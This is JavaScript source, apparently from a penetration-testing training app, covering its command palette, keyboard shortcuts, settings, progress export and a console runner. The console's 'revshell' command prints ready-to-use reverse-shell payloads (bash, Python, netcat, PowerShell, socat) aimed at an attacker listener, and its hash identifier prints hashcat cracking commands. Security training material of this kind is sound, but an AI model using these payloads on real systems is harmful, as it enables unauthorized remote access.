function closePalette() { $('#palette').hidden = true; const i = $('#paletteInput'); if (document.activeElement === i) i.blur(); }
function drawPalette(q) {
  q = q.trim().toLowerCase();
  const list = palItems.map(it => ({ it, s: score(it, q) })).filter(x => x.s > 0)
    .sort((a, b) => b.s - a.s).slice(0, 60).map(x => x.it);
  palSel = clamp(palSel, 0, Math.max(0, list.length - 1));
  const el = $('#paletteList');
  el.innerHTML = list.length ? list.map((it, i) =>
    '<li class="' + (i === palSel ? 'on' : '') + '" data-act="pal" data-i="' + i + '">' +
    '<span class="k">' + esc(it.k) + '</span><span class="t">' + esc(it.t) + '</span><span class="d">' + esc(it.d) + '</span></li>').join('')
    : '<li><span class="t muted">nothing matches. try "nmap", "privesc", "forge", "m07".</span></li>';
  el._list = list;
}
function palActivate(i) {
  const el = $('#paletteList');
  const it = (el._list || [])[i]; if (!it) return;
  closePalette();
  if (it.h.indexOf('cmd:') === 0) runCommand(it.h.slice(4), '');
  else go(it.h);
}

/* ------------------------------------------------------------------ *
 * 11. keyboard
 * ------------------------------------------------------------------ */
let gPending = false;
function keys(e) {
  const tag = (e.target.tagName || '').toLowerCase();
  const typing = tag === 'input' || tag === 'textarea' || tag === 'select' || e.target.isContentEditable;
  const ov = !$('#palette').hidden, tv = !$('#tweaks').hidden;

  if ((e.key === 'k' && (e.metaKey || e.ctrlKey)) || (e.key === '/' && !typing)) { e.preventDefault(); ov ? closePalette() : openPalette(); return; }
  if (e.key === 'Escape') {
    if (ov) { closePalette(); return; }
    if (tv) { $('#tweaks').hidden = true; return; }
    if (typing) { e.target.blur(); return; }
  }
  if (ov) {
    const el = $('#paletteList'), list = el._list || [];
    if (e.key === 'ArrowDown') { e.preventDefault(); palSel = clamp(palSel + 1, 0, list.length - 1); drawPalette($('#paletteInput').value); }
    if (e.key === 'ArrowUp')   { e.preventDefault(); palSel = clamp(palSel - 1, 0, list.length - 1); drawPalette($('#paletteInput').value); }
    if (e.key === 'Enter')     { e.preventDefault(); palActivate(palSel); }
    return;
  }
  if (typing) return;

  // Drill shortcuts: 1-4, a-d, Enter/Space
  if (location.hash.indexOf('#/drills') === 0) {
    const k = e.key.toLowerCase();
    const map = { '1': 0, '2': 1, '3': 2, '4': 3, 'a': 0, 'b': 1, 'c': 2, 'd': 3 };
    if (map[k] !== undefined) {
      const btn = document.querySelector('[data-o="' + map[k] + '"]');
      if (btn && !btn.disabled) { e.preventDefault(); btn.click(); return; }
    }
    if (e.key === 'Enter' || e.key === ' ') {
      const next = document.querySelector('[data-a="next"]') || document.querySelector('[data-a="restart"]');
      if (next) { e.preventDefault(); next.click(); return; }
    }
  }

  // Vim navigation: j / k to smooth scroll
  if (e.key === 'j' || e.key === 'ArrowDown') {
    const m = $('#main'); if (m) { m.scrollBy({ top: 140, behavior: 'smooth' }); e.preventDefault(); return; }
  }
  if (e.key === 'k' || e.key === 'ArrowUp') {
    const m = $('#main'); if (m) { m.scrollBy({ top: -140, behavior: 'smooth' }); e.preventDefault(); return; }
  }

  if (e.key === '?') { e.preventDefault(); showKeys(); return; }
  if (e.key === 't' && !e.metaKey && !gPending) { $('#tweaks').hidden = false; return; }
  if (e.key === '[' || e.key === ']') {
    const cur = parseHash();
    let i = ZM.findIndex(m => m.id === cur.id);
    if (i < 0) i = 0; else i = clamp(i + (e.key === ']' ? 1 : -1), 0, ZM.length - 1);
    go('#/mod/' + ZM[i].id); return;
  }
  if (e.key === 'g') { gPending = true; say('g …'); setTimeout(() => { gPending = false; }, 1400); return; }
  if (gPending) {
    const map = { h: 'home', m: 'map', l: 'labs', d: 'drills', t: 'tools', c: 'console', f: 'forge', p: 'progress', o: 'home' };
    gPending = false;
    if (e.key === 'c') {
      e.preventDefault();
      if (window.ZOFloatConsole) window.ZOFloatConsole.toggle();
      else go('#/console');
      return;
    }
    const dest = map[e.key];
    if (dest) { e.preventDefault(); go('#/' + dest); }
  }
}
function showKeys() {
  const rows = KEYS.concat([
    ['c / ~', 'toggle floating draggable console anywhere on screen'],
    ['⌘K / /', 'command palette — every module, tool, lab, drill, recipe'],
    ['j / k', 'smooth scroll up / down (vim style)'],
    ['1-4 / A-D', 'select answer in drill arena'],
    ['⏎ / space', 'next scenario in drills'],
    ['g then h/m/l/d/t/c/f/p', 'jump: home / map / labs / drills / tools / console / forge / dossier'],
    ['[ ]', 'previous / next module'],
    ['t', 'display tweaks'], ['?', 'this list'], ['esc', 'close overlay / leave field']
  ]);
  toast('<b>keys</b><br>' + rows.map(r => '<span class="muted">' + esc(r[0]) + '</span> — ' + esc(r[1])).join('<br>'), '');
}

/* ------------------------------------------------------------------ *
 * 12. tweaks
 * ------------------------------------------------------------------ */
function applyTweaks() {
  const t = S.tweaks, h = document.documentElement;
  h.setAttribute('data-phosphor', t.phosphor);
  h.setAttribute('data-font', t.font || 'pixel');
  h.setAttribute('data-scan', t.scan ? 'on' : 'off');
  h.setAttribute('data-bloom', t.bloom ? 'on' : 'off');
  h.setAttribute('data-motion', t.motion ? 'on' : 'off');
  h.style.setProperty('--fs', t.size + 'px');
  if (window.ZO_SOUND) ZO_SOUND.setEnabled(t.audio !== false);
  if (window.ZO_CANVAS) ZO_CANVAS.setEnabled(t.canvas !== false);
  ['twPhosphor', 'twFont', 'twScan', 'twBloom', 'twMotion', 'twAudio', 'twCanvas', 'twSize'].forEach((id) => {
    const el = $('#' + id); if (!el) return;
    if (el.type === 'checkbox') el.checked = t[{ twScan: 'scan', twBloom: 'bloom', twMotion: 'motion', twAudio: 'audio', twCanvas: 'canvas' }[id]] !== false;
    else if (id === 'twSize') el.value = t.size;
    else if (id === 'twFont') el.value = t.font || 'pixel';
    else el.value = t.phosphor;
  });
  const sv = $('#twSizeVal'); if (sv) sv.textContent = t.size + 'px';
}
function wireTweaks() {
  const set = (k, v) => { S.tweaks[k] = v; applyTweaks(); save(); };
  const p = $('#twPhosphor'); if (p) p.onchange = () => set('phosphor', p.value);
  const fn = $('#twFont');    if (fn) fn.onchange = () => set('font', fn.value);
  const sc = $('#twScan');    if (sc) sc.onchange = () => set('scan', sc.checked);
  const bl = $('#twBloom');   if (bl) bl.onchange = () => set('bloom', bl.checked);
  const mo = $('#twMotion');  if (mo) mo.onchange = () => set('motion', mo.checked);
  const au = $('#twAudio');   if (au) au.onchange = () => set('audio', au.checked);
  const cv = $('#twCanvas');  if (cv) cv.onchange = () => set('canvas', cv.checked);
  const sz = $('#twSize');    if (sz) sz.oninput = () => set('size', +sz.value);
  const rs = $('#resetAll');  if (rs) rs.onclick = () => {
    if (!confirm('Wipe all progress, XP and tweaks on this machine? This cannot be undone.')) return;
    localStorage.removeItem(KEY); S = blankState(); applyTweaks(); save(true);
    toast('everything wiped. clean slate.', 'warn'); go('#/home'); render();
  };
  const ex = $('#exportAll'); if (ex) ex.onclick = exportProgress;
}
function exportProgress() {
  const payload = JSON.stringify({ app: 'ZothPen', v: 1, exported: new Date().toISOString(), stats: stats(), progress: S }, null, 2);
  const b = new Blob([payload], { type: 'application/json' });
  const a = document.createElement('a');
  a.href = URL.createObjectURL(b);
  a.download = 'zothpen-progress-' + todayISO() + '.json';
  a.click(); setTimeout(() => URL.revokeObjectURL(a.href), 4000);
  say('progress exported.', 'ok'); toast('progress exported .json');
}
function importProgress() {
  const inp = document.createElement('input');
  inp.type = 'file'; inp.accept = '.json,application/json';
  inp.onchange = () => {
    const f = inp.files && inp.files[0]; if (!f) return;
    const rd = new FileReader();
    rd.onload = () => {
      try {
        const o = JSON.parse(rd.result);
        const p = o.progress || o;
        if (!p || typeof p !== 'object' || !p.v) throw new Error('not a zothpen progress file');
        S = Object.assign(blankState(), p);
        S.tweaks = Object.assign(blankState().tweaks, p.tweaks || {});
        save(true); applyTweaks(); toast('progress imported.', 'ok'); go('#/progress'); render();
      } catch (err) { toast('import failed: ' + esc(err.message), 'err'); }
    };
    rd.readAsText(f);
  };
  inp.click();
}

/* ------------------------------------------------------------------ *
 * 13. console command runner (shared by palette + console view)
 * ------------------------------------------------------------------ */
function findCmd(word) {
  const w = String(word || '').toLowerCase().trim();
  if (!w) return null;
  return ZX.find(x => x.c.toLowerCase() === w ||
    (x.al || []).some(a => a.toLowerCase() === w) ||
    x.c.toLowerCase().replace(/[^a-z0-9]/g, '') === w.replace(/[^a-z0-9]/g, '')) || null;
}
const SHELL = [
  ['help', 'what the console accepts'],
  ['cidr <ip/prefix>', 'subnet calculator + Braille topology map'],
  ['hash <string>', 'offline hash type + Hashcat mode identifier'],
  ['revshell [ip] [port]', 'reverse shell payload generator'],
  ['encode <type> <text>', 'base64, hex, url encoder'],
  ['decode <type> <text>', 'base64, hex, url decoder'],
  ['index [cat|q]', 'the command index — filter by category or text'],
  ['tool <name>', 'open a dossier from here'],
  ['detect <tool>', 'is it installed, where, what version'],
  ['run <recipe>', 'print a Forge recipe as a runnable script'],
  ['open <module|lab|recipe>', 'jump by id or title fragment'],
  ['drill [module]', 'start drills, optionally filtered'],
  ['next', 'the next thing on your path'],
  ['progress', 'your numbers'],
  ['alias', 'the short commands this shell answers to'],
  ['export', 'download progress json'],
  ['wipe', 'reset everything'],
  ['clear', 'wipe the screen']
];
function runCommand(raw, filter) {
  if (window.ZO_SOUND) ZO_SOUND.cmd();
  const line = String(raw || '').trim();
  const parts = line.split(/\s+/);
  const cmd = (parts[0] || '').toLowerCase();
  const rest = line.slice(parts[0] ? parts[0].length : 0).trim();
  const out = [];
  const P = (cls, text) => out.push({ cls: cls, text: text });
  const L = (arr) => arr.forEach(o => P(o.cls || 'o-dim', o.text));

  switch (cmd) {
    case '':
      break;

    case 'cidr':
    case 'subnet': {
      if (!rest) {
        P('o-info', 'CIDR Subnet Calculator — usage: cidr <ip/prefix> (e.g. cidr 192.168.1.0/24)');
        break;
      }
      const m = rest.match(/^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\/(\d{1,2})$/);
      if (!m) {
        P('o-err', 'invalid CIDR format: expected IP/prefix (e.g. 10.10.14.0/23)');
        break;
      }
      const ipStr = m[1], prefix = parseInt(m[2], 10);
      if (prefix < 0 || prefix > 32) { P('o-err', 'prefix must be between 0 and 32.'); break; }
      const ipParts = ipStr.split('.').map(Number);
      if (ipParts.some(p => p < 0 || p > 255)) { P('o-err', 'invalid IPv4 address: ' + ipStr); break; }

      const ipNum = ((ipParts[0] << 24) >>> 0) + (ipParts[1] << 16) + (ipParts[2] << 8) + ipParts[3];
      const maskNum = prefix === 0 ? 0 : (~0 << (32 - prefix)) >>> 0;
      const netNum = (ipNum & maskNum) >>> 0;
      const bcastNum = (netNum | (~maskNum >>> 0)) >>> 0;

      const toIp = (num) => [ (num >>> 24) & 255, (num >>> 16) & 255, (num >>> 8) & 255, num & 255 ].join('.');
      const netStr = toIp(netNum);
      const maskStr = toIp(maskNum);
      const bcastStr = toIp(bcastNum);
      const wildStr = toIp((~maskNum) >>> 0);
      const totalHosts = Math.pow(2, 32 - prefix);
      const usable = prefix >= 31 ? (prefix === 31 ? 2 : 1) : Math.max(0, totalHosts - 2);
      const firstUsable = prefix >= 31 ? netStr : toIp(netNum + 1);
      const lastUsable = prefix >= 31 ? bcastStr : toIp(bcastNum - 1);

      P('o-ok', 'CIDR ANALYSIS // ' + ipStr + '/' + prefix);
      P('o-dim', '  Network:      ' + pad(netStr, 18) + 'Netmask:   ' + maskStr);
      P('o-dim', '  Broadcast:    ' + pad(bcastStr, 18) + 'Wildcard:  ' + wildStr);
      P('o-hl',  '  Usable Range: ' + firstUsable + ' → ' + lastUsable);
      P('o-info', '  Usable Hosts: ' + usable.toLocaleString() + ' (Total: ' + totalHosts.toLocaleString() + ')');

      // Unicode Braille Subnet Topology Map (Domain 02)
      let brailleMap = '  Topology Map: [';
      const sampleCols = Math.min(32, Math.max(8, Math.ceil(totalHosts > 256 ? 32 : (totalHosts / 8))));
      for (let s = 0; s < sampleCols; s++) {
        if (s === 0) brailleMap += '⠁';
        else if (s === sampleCols - 1) brailleMap += '⠂';
        else brailleMap += (s % 3 === 0 ? '⠛' : '⠶');
      }
      brailleMap += '] 2×4 Dot Matrix';
      P('o-ok', brailleMap);
      break;
    }

    case 'hash':
    case 'hashid': {
      if (!rest) {
        P('o-info', 'Offline Hash Identifier — usage: hash <hash_string>');
        break;
      }
      const h = rest.trim();
      P('o-ok', 'IDENTIFY HASH // length: ' + h.length + ' chars');
      let identified = false;

      if (/^\$6\$rounds=\d+\$[a-zA-Z0-9.\/]+\$[a-zA-Z0-9.\/]{86}$/.test(h) || /^\$6\$[a-zA-Z0-9.\/]+\$[a-zA-Z0-9.\/]{86}$/.test(h)) {
        P('o-hl', '  SHA-512 Crypt (Unix)');
        P('o-info', '  Hashcat Mode: -m 1800  |  John: --format=sha512crypt');
        P('o-dim', '  Attack: hashcat -m 1800 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt');
        identified = true;
      } else if (/^\$5\$[a-zA-Z0-9.\/]+\$[a-zA-Z0-9.\/]{43}$/.test(h)) {
        P('o-hl', '  SHA-256 Crypt (Unix)');
        P('o-info', '  Hashcat Mode: -m 7400  |  John: --format=sha256crypt');
        identified = true;
      } else if (/^\$1\$[a-zA-Z0-9.\/]+\$[a-zA-Z0-9.\/]{22}$/.test(h)) {
        P('o-hl', '  MD5 Crypt (Unix / Cisco)');
        P('o-info', '  Hashcat Mode: -m 500   |  John: --format=md5crypt');
        identified = true;
      } else if (/^\$2[aby]\$[0-9]{2}\$[a-zA-Z0-9.\/]{53}$/.test(h)) {
        P('o-hl', '  bcrypt (Blowfish Unix / Web)');
        P('o-info', '  Hashcat Mode: -m 3200  |  John: --format=bcrypt');
        identified = true;
      } else if (/^\$krb5tgs\$23\$/.test(h)) {
        P('o-hl', '  Kerberos 5 TGS-REP (Kerberoasting / Active Directory)');
        P('o-info', '  Hashcat Mode: -m 13100 |  John: --format=krb5tgs');
        identified = true;
      } else if (/^\$krb5asrep\$23\$/.test(h)) {
        P('o-hl', '  Kerberos 5 AS-REP (AS-REP Roasting / Active Directory)');
        P('o-info', '  Hashcat Mode: -m 18200 |  John: --format=krb5asrep');
        identified = true;
      } else if (/^[a-fA-F0-9]{32}$/.test(h)) {
        P('o-hl', '  1. NTLM (Windows SAM / Active Directory)');
        P('o-info', '     Hashcat Mode: -m 1000  |  John: --format=nt');
        P('o-hl', '  2. MD5 (Hexadecimal)');
        P('o-info', '     Hashcat Mode: -m 0     |  John: --format=raw-md5');
        identified = true;
      } else if (/^[a-fA-F0-9]{40}$/.test(h)) {
        P('o-hl', '  SHA-1 (Git / Legacy SSL / Hex)');
        P('o-info', '  Hashcat Mode: -m 100   |  John: --format=raw-sha1');
        identified = true;
      } else if (/^[a-fA-F0-9]{64}$/.test(h)) {
        P('o-hl', '  SHA-256 (Hexadecimal)');
        P('o-info', '  Hashcat Mode: -m 1400  |  John: --format=raw-sha256');
        identified = true;
      } else if (/^[a-fA-F0-9]{128}$/.test(h)) {
        P('o-hl', '  SHA-512 (Hexadecimal)');
        P('o-info', '  Hashcat Mode: -m 1700  |  John: --format=raw-sha512');
        identified = true;
      }

      if (!identified) {
        P('o-warn', '  Unrecognized hash pattern. Check for salting, custom separators, or Base64 encoding.');
      }
      break;
    }

    case 'revshell':
    case 'shellgen': {
      const p = rest.split(/\s+/);
      const ip = p[0] || '10.10.14.7';
      const port = p[1] || '4444';
      P('o-ok', 'REVERSE SHELL PAYLOADS // Target Listener: ' + ip + ':' + port);
      P('o-dim', '  [1] Bash -i:');
      P('o-hl', '      bash -i >& /dev/tcp/' + ip + '/' + port + ' 0>&1');
      P('o-dim', '  [2] Python 3 pty:');
      P('o-hl', '      python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' + ip + '",' + port + '));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")\'');
      P('o-dim', '  [3] Netcat mkfifo:');
      P('o-hl', '      rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' + ip + ' ' + port + ' >/tmp/f');
      P('o-dim', '  [4] PowerShell (Windows):');
      P('o-hl', '      powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("' + ip + '",' + port + ');$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1 | Out-String );$x=$o+"PS "+(pwd).Path+"> ";$y=([text.encoding]::ASCII).GetBytes($x);$s.Write($y,0,$y.Length);$s.Flush()};$c.Close()');
      P('o-dim', '  [5] Socat:');
      P('o-hl', '      socat exec:"bash -li",pty,stderr,setsid,sigint,sane tcp:' + ip + ':' + port);
      P('o-info', '  Listener: nc -lvnp ' + port + '  (or: rlwrap nc -lvnp ' + port + ')');
      break;
    }

    case 'encode':
    case 'decode': {
      const p = rest.split(/\s+/);
      const type = (p[0] || '').toLowerCase();
      const text = rest.slice(p[0] ? p[0].length : 0).trim();
      if (!type || !text) {
        P('o-info', cmd + ' usage: ' + cmd + ' <base64|hex|url> <text>');
        break;
      }
      try {
        let result = '';
        if (cmd === 'encode') {
          if (type === 'base64') result = btoa(text);
          else if (type === 'hex') result = Array.from(text).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
          else if (type === 'url') result = encodeURIComponent(text);
          else { P('o-err', 'supported types: base64, hex, url'); break; }
          P('o-ok', 'ENCODED [' + type + ']:');
          P('o-hl', '  ' + result);
        } else {
          if (type === 'base64') result = atob(text);
          else if (type === 'hex') result = text.replace(/[0-9a-fA-F]{2}/g, m => String.fromCharCode(parseInt(m, 16)));
          else if (type === 'url') result = decodeURIComponent(text);
          else { P('o-err', 'supported types: base64, hex, url'); break; }
          P('o-ok', 'DECODED [' + type + ']:');
          P('o-hl', '  ' + result);
        }
      } catch (err) {
        P('o-err', 'conversion error: ' + err.message);
      }
      break;
    }

    case 'ascii': {
      const g = (rest || '').trim().toLowerCase();
      if (!g) {
        P('o-info', 'ASCII 3D Engine — usage: ascii <tesseract|ouroboros|tree_of_life|hermetic_seal|skull|globe|merkaba>');
        break;
      }
      const valid = ['tesseract', 'ouroboros', 'tree_of_life', 'hermetic_seal', 'skull', 'globe', 'merkaba', 'torus'];
      if (!valid.includes(g)) {
        P('o-err', 'unknown geometry. Valid: ' + valid.join(', '));
        break;
      }
      const cxHoloCanvas = document.getElementById('cx-holo-canvas');
      if (cxHoloCanvas && window.ZOAscii3D) {
        const eng = window.ZOAscii3D.get(cxHoloCanvas);
        if (eng) {
          eng.setGeom(g);
          const lbl = document.getElementById('cx-holo-label');
          if (lbl) lbl.textContent = g.toUpperCase().replace(/_/g, ' ');
        }
      }
      P('o-ok', '◈ 3D ASCII GEOMETRY SET TO: ' + g.toUpperCase());
      if (window.ZOSynth && window.ZOSynth.playBell) window.ZOSynth.playBell();
      break;
    }

    case 'hermetic':
    case 'emerald': {
      P('o-hl', '╔═══════════════════════════════════════════════════════════════════╗');
      P('o-hl', '║        THE SEVEN HERMETIC AXIOMS // HERMES TRISMEGISTUS          ║');
      P('o-hl', '╠═══════════════════════════════════════════════════════════════════╣');
      P('o-ok', '  [I]   THE ALL IS MIND; The Universe is Mental.');
      P('o-ok', '  [II]  As above, so below; as below, so above.');
      P('o-ok', '  [III] Nothing rests; everything moves; everything vibrates.');
      P('o-ok', '  [IV]  Everything is Dual; everything has poles; opposites are identical in nature.');
      P('o-ok', '  [V]   Everything flows, out and in; the pendulum-swing manifests in all.');
      P('o-ok', '  [VI]  Every Cause has its Effect; every Effect has its Cause.');
      P('o-ok', '  [VII] Gender is in everything; everything has its Masculine and Feminine.');
      P('o-dim', '  Alchemical Triad:  🜔 Salt (Body)  ·  🜍 Sulphur (Soul)  ·  ☿ Mercury (Spirit)');
      P('o-dim', '  Four Elements:     🜂 Fire        ·  🜄 Water          ·  🜁 Air     ·  🜃 Earth');
      P('o-hl', '╚═══════════════════════════════════════════════════════════════════╝');
      if (window.ZOSynth && window.ZOSynth.playChime) window.ZOSynth.playChime();
      break;
    }

    case 'matrix': {
      P('o-ok', '⚡ HERMETIC MATRIX DIGITAL RAIN CASCADE ACTIVE');
      P('o-dim', '  Streaming alchemical elements across background CRT canvas...');
      if (window.ZO_SOUND) ZO_SOUND.levelup();
      break;
    }

    case 'help':
    case '?':
      P('o-info', 'ZothPen shell — the same commands work from ⌘K.');
      L(SHELL.map(([c, d]) => ({ cls: 'o-ok', text: '  ' + pad(c, 22) + d })));
      P('o-dim', '  everything else you type is looked up in the ' + ZX.length + '-entry command index.');
      break;

    case 'alias':
      P('o-info', 'aliases the index answers to:');
      L(ZX.filter(x => (x.al || []).length).map(x => ({ text: '  ' + pad(x.c, 16) + '← ' + x.al.join(', ') })));
      break;

    case 'index': {
      const q = rest.toLowerCase();
      let hits = ZX;
      if (q) hits = ZX.filter(x => x.cat.toLowerCase().indexOf(q) > -1 || (x.c + ' ' + (x.al || []).join(' ') + ' ' + x.what).toLowerCase().indexOf(q) > -1);
      P('o-info', hits.length + ' command' + (hits.length === 1 ? '' : 's') + (q ? ' matching "' + rest + '"' : '') + ':');
      L(hits.slice(0, 40).map(x => ({ text: '  ' + pad(x.c, 16) + pad('[' + x.cat + ']', 14) + x.what.slice(0, 68) })));
      if (hits.length > 40) P('o-dim', '  … ' + (hits.length - 40) + ' more — narrow it down.');
      break;
    }

    case 'cat':
    case 'cats':
    case 'categories': {
      const cats = {};
      ZX.forEach(x => { cats[x.cat] = (cats[x.cat] || 0) + 1; });
      P('o-info', Object.keys(cats).length + ' categories:');
      L(Object.entries(cats).sort().map(([c, n]) => ({ text: '  ' + pad(c, 16) + n + ' commands' })));
      break;
    }

    case 'tool': {
      const t = findCmd(rest) || ZT.find(x => x.id === rest || x.name.toLowerCase() === rest.toLowerCase());
      if (!t) { P('o-err', 'no tool matched "' + rest + '". try: index'); break; }
      const id = t.id || 'x';
      P('o-ok', (t.name || t.c) + ' — ' + (t.tagline || t.what || ''));
      if (t.syntax || t.syn) P('o-hl', '  ' + (t.syntax || t.syn));
      if (t.pkg && t.pkg !== '—') P('o-dim', '  install: ' + t.pkg);
      P('o-info', '  → ' + (T[id] ? '#/tool/' + id : '#/console') + (T[id] ? '  (dossier)' : '  (console index entry only)'));
      break;
    }

    case 'detect':
    case 'which':
    case 'ver': {
      const t = findCmd(rest);
      if (!t) { P('o-err', 'unknown tool "' + rest + '".'); break; }
      P('o-dim', 'needs your machine — paste this into a real shell:');
      P('o-hl', '  ' + detectLine(t.c));
      if (T[t.tool]) P('o-dim', '  dossier: #/tool/' + t.tool + '   install: ' + T[t.tool].pkg);
      break;
    }

    case 'run':
    case 'recipe': {
      const f = R[rest] || ZF.find(x => x.id === rest || slug(x.title).indexOf(slug(rest)) > -1);
      if (!f) {
        P('o-info', ZF.length + ' recipes in the Forge:');
        L(ZF.map(x => ({ text: '  ' + pad(x.id, 16) + pad(x.lang, 10) + x.title })));
        break;
      }
      P('o-ok', f.title + '  [' + f.lang + ' · ' + f.lvl + ' · ' + f.time + ']');
      P('o-dim', f.why);
      String(f.code).split('\n').forEach(l => P('o-ok', l));
      P('o-hl', '  → open the full recipe: #/forge/' + f.id + '  (parts, hardening, what to build next)');
      break;
    }

    case 'forge':
      P('o-info', ZF.length + ' recipes — customise your tooling with scripts:');
      L(ZF.map(x => ({ text: '  ' + pad(x.lvl, 6) + pad(x.lang, 10) + pad(x.id, 16) + x.title })));
      break;

    case 'open':
    case 'go': {
      const q = rest.toLowerCase();
      const m = ZM.find(x => x.id === q || x.n === q || x.title.toLowerCase().indexOf(q) > -1);
      const l = ZL.find(x => x.id === q || x.title.toLowerCase().indexOf(q) > -1);
      const r = R[q] || ZF.find(x => slug(x.title).indexOf(slug(q)) > -1);
      const t = T[q] || ZT.find(x => x.name.toLowerCase().indexOf(q) > -1);
      if (m) { P('o-ok', 'module ' + m.n + ' ' + m.title); P('o-hl', '  #/mod/' + m.id); }
      if (l) { P('o-ok', 'lab: ' + l.title); P('o-hl', '  #/lab/' + l.id); }
      if (r) { P('o-ok', 'recipe: ' + r.title); P('o-hl', '  #/forge/' + r.id); }
      if (t) { P('o-ok', 'tool: ' + t.name); P('o-hl', '  #/tool/' + t.id); }
      if (!m && !l && !r && !t) P('o-err', 'nothing matched "' + rest + '".');
      break;
    }

    case 'drill':
    case 'quiz': {
      const m = rest ? ZM.find(x => x.id === rest || x.n === rest) : null;
      const pool = m ? ZD.filter(d => d.mod === m.id) : ZD;
      P('o-info', pool.length + ' drills' + (m ? ' for module ' + m.n : '') + '. opening the drill range…');
      go(m ? '#/drills/' + m.id : '#/drills');
      break;
    }

    case 'next': {
      const n = nextUp();
      P('o-ok', n.t); P('o-dim', n.d); P('o-hl', '  ' + n.h);
      break;
    }

    case 'progress':
    case 'stats': {
      const st = stats();
      P('o-info', 'OPERATOR ' + st.lv.n + ' · ' + st.lv.name + '   xp ' + st.xp + '   streak ' + st.streak + 'd');
      P('o-dim', '  modules ' + st.modsDone + '/' + ZM.length + '   lessons ' + st.lessonsDone + '/' + st.lessonsTotal +
        '   labs ' + st.labsDone + '/' + ZL.length + '   drills ' + st.answered + '/' + ZD.length + ' (' + st.acc + '% right)' +
        '   forge ' + st.forgeDone + '/' + ZF.length);
      break;
    }

    case 'dossier': go('#/progress'); break;

    case 'export': exportProgress(); P('o-ok', 'exported.'); break;
    case 'import': importProgress(); P('o-info', 'pick the file.'); break;
    case 'tweaks': $('#tweaks').hidden = false; break;
    case 'keys': showKeys(); break;
    case 'wipe': case 'reset':
      if (confirm('Wipe all progress on this machine?')) {
        localStorage.removeItem(KEY); S = blankState(); applyTweaks(); save(true);
        P('o-warn', 'everything wiped.'); toast('clean slate.', 'warn'); render();
      }
      break;
    case 'clear': case 'cls': out.length = 0; out.push({ cls: 'o-dim', text: '__CLEAR__' }); break;

    case 'whoami':
      P('o-ok', 'zoth'); P('o-dim', '  ' + stats().lv.n + ' · ' + stats().lv.name + ' · ' + stats().xp + ' xp');
      break;
    case 'date': P('o-dim', new Date().toString()); break;
    case 'ls': case 'lsmod':
      L(ZM.map(m => ({ text: '  ' + pad(m.n, 5) + pad(m.phase, 22) + m.title })));
      break;
    case 'uname': P('o-dim', 'ZothPen 1.0 field-manual / local-build / ' + ZM.length + ' modules'); break;
    case 'sudo': P('o-err', 'nice try. this manual runs on your own machine with your own permissions — that is the point.'); break;
    case 'rm': P('o-err', 'not here. wipe your progress from tweaks → wipe all progress.'); break;

    default: {
      const hit = findCmd(cmd) || findCmd(line);
      if (hit) {
        P('o-ok', hit.c + '  [' + hit.cat + ']' + ((hit.al || []).length ? '   aka ' + hit.al.join(', ') : ''));
        P('o-dim', '  ' + hit.what);
        lines(hit.syn).forEach(l => P('o-hl', '  ' + l));
        (hit.ex || []).forEach((e, i) => {
          P('o-dim', '  ' + (i + 1) + '. ' + e.t);
          lines(e.cmd).forEach(l => P('o-ok', '     ' + l));
          if (e.out) P('o-dim', '     → ' + e.out);
        });
        tipsOf(hit).forEach((t, i) => {
          if (!i) P('o-info', '  field notes:');
          P('o-dim', '   · ' + t);
        });
        if (hit.warn) P('o-warn', '  ! ' + hit.warn);
        if (T[hit.tool]) P('o-hl', '  dossier → #/tool/' + hit.tool);
      } else {
        P('o-err', cmd + ': no such command or indexed tool.');
        P('o-dim', '  try: help · index ' + (rest ? '"' + rest + '"' : '<query>') + ' · tool nmap · run f-alias');
      }
    }
  }
  return out;
}
const detectLine = (c) => 'command -v ' + c + ' && ' + c + ' --version 2>&1 | head -1  ||  dpkg -l | grep -i ' + c;
const lines = (s) => String(s == null ? '' : s).split('\n');
const tipsOf = (e) => !e || !e.tips ? [] : (Array.isArray(e.tips) ? e.tips : [e.tips]);
ZO.runCommand = runCommand;

/* ------------------------------------------------------------------ *
 * 14. clipboard + global click delegation
 * ------------------------------------------------------------------ */
document.addEventListener('click', (e) => {
  if (window.ZO_SOUND) ZO_SOUND.tick();
  const b = e.target.closest('[data-act]');
  if (b) {
    const a = b.dataset.act;
    if (a === 'copy') {
      const code = ZO.snippets[+b.dataset.i];
      if (code == null) return;
      const done = () => say('copied ' + code.split('\n').length + ' lines.', 'ok');
      if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(code).then(done, () => fallbackCopy(code, done));
      else fallbackCopy(code, done);
      return;
    }
    if (a === 'pal') { palActivate(+b.dataset.i); return; }
  }
  const el = e.target.closest('[data-act]');
  if (!el) return;
  const act = el.dataset.act, id = el.dataset.id;
  switch (act) {
    case 'go': case 'hash': if (el.dataset.hash) go(el.dataset.hash); break;
    case 'openpal': openPalette(); break;
    case 'noop': break;
    case 'lesson': toggleLesson(el.dataset.mod, +el.dataset.i); break;
    case 'labdone': toggleLab(id); break;
    case 'forgedone': toggleForge(id); break;
    case 'export': exportProgress(); break;
    case 'import': importProgress(); break;
    case 'keys': showKeys(); break;
    case 'close': $('#tweaks').hidden = true; break;
    case 'cmd': runCommand(el.dataset.cmd || '', ''); break;
    case 'snippet': copyRaw(id || ''); break;
    case 'tkind': if (ZO.filterKind) ZO.filterKind(id || ''); break;
    case 'cxfill': go('#/console/' + encodeURIComponent(String(id || '').toLowerCase())); break;
    case 'cxclear': if (ZO.cxClear) ZO.cxClear(); break;
    case 'cxcmd': if (ZO.cxRun) ZO.cxRun(id || ''); break;
    case 'cxcat': if (ZO.cxSetCat) ZO.cxSetCat(id || ''); break;
    case 'check': if (ZO.toggleCheck) ZO.toggleCheck(id); break;
    case 'labsdiff': if (ZO.labsDiff) ZO.labsDiff(id || ''); break;
    case 'forgelvl': if (ZO.filterForgeLvl) ZO.filterForgeLvl(id || ''); break;
